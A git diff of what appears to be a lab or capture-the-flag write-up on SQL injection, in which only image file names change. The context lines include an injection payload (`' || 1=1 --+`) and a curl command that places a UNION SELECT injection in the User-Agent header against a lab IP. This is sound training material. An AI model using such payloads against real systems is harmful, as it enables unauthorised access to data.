@@ -233,7 +233,7 @@ Now, URL encode the payload `Intro to PHP' || 1=1 --+` using [Cyber Chef](https:
 
 **Note:** It was not working from the browser so I copied and pasted the output of CyberChef into Burp to get the results.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 
@@ -634,7 +634,7 @@ The union needs to be the same amount of columns as the original statement which
 curl -H "User-Agent: ' UNION SELECT flag, flag FROM books where book_id=1; # " http://10.10.41.101/httpagent/
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
